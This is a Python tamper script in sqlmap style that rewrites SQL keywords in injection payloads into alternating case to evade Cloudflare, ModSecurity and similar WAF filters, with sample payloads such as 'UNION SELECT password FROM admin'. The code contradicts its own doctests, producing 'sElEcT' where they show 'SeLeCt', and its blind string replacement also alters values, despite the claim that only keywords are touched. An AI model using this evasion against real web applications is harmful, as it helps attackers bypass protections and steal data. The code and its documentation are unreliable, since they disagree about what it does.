#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: cloudflare_case.py
Description: Alternating case obfuscation for SQL keywords
Author: Regaan
Priority: LOW
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Applies alternating case to SQL keywords to bypass case-sensitive WAF rules.
    
    This is a DETERMINISTIC transformation - same input always produces same output.
    
    Technique:
        Converts SQL keywords to alternating case (e.g., SELECT -> SeLeCt)
        Pattern: lowercase, uppercase, lowercase, uppercase...
    
    Tested against:
        * Cloudflare WAF
        * ModSecurity
        * Case-sensitive WAF rules
    
    Notes:
        * Deterministic - always produces same alternating pattern
        * Only affects SQL keywords, not values
        * Should be applied LAST in tamper chain
    
    >>> tamper("SELECT * FROM users WHERE id=1")
    'SeLeCt * FrOm users WhErE id=1'
    
    >>> tamper("UNION SELECT password FROM admin")
    'UnIoN SeLeCt password FrOm admin'
    """
    
    retVal = payload
    
    if payload:
        # SQL keywords to apply alternating case
        keywords = [
            'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE',
            'ALTER', 'TRUNCATE', 'REPLACE', 'WHERE', 'FROM', 'JOIN', 'INNER',
            'OUTER', 'LEFT', 'RIGHT', 'ORDER', 'GROUP', 'HAVING', 'LIMIT',
            'AND', 'OR', 'NOT', 'IN', 'LIKE', 'BETWEEN', 'IS', 'NULL'
        ]
        
        for keyword in keywords:
            # Create alternating case version
            alternating = ''.join(
                char.lower() if i % 2 == 0 else char.upper()
                for i, char in enumerate(keyword)
            )
            
            # Replace all case variations with alternating case
            retVal = retVal.replace(keyword, alternating)
            retVal = retVal.replace(keyword.lower(), alternating)
            retVal = retVal.replace(keyword.capitalize(), alternating)
    
    return retVal
